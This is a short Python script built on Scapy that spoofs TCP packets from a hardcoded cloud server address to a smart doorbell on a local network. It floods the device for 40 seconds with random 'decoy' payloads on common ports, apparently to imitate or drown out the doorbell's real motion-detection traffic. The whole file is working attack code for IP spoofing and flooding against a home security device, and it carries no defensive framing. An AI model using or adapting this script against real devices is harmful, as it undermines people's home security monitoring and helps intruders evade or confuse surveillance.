from scapy.all import *
import time
import random

#  Doorbell IP (change based on ip)
target_ip = "192.168.137.63"

#Cloud IP that real motion detection traffic uses
cloud_ip = "47.254.187.57"  

# Ports to mimick ( normal traffic)
fake_ports = [80, 443, 554, 8000, 8888]

def send_camouflage(duration=40):
    print(f"Flooding network with decoy traffic from {cloud_ip} to {target_ip} for {duration} seconds...")
    start = time.time()

    while time.time() - start < duration:
        src_port = random.randint(1024, 65535)
        dst_port = random.choice(fake_ports)
        fake_payload = f"decoy_{random.randint(10000,99999)}"

        # Simulate motion-like traffic from the cloud server
        packet = IP(src=cloud_ip, dst=target_ip) / TCP(sport=src_port, dport=dst_port) / Raw(load=fake_payload)
        send(packet, verbose=False)

        time.sleep(0.01)  #change packet rate 

    print("\n Finished sending decoy motion detection traffic")

if __name__ == "__main__":
    try:
        send_camouflage(duration=40)
    except KeyboardInterrupt:
        print("\n Stopped fake packets transmission.")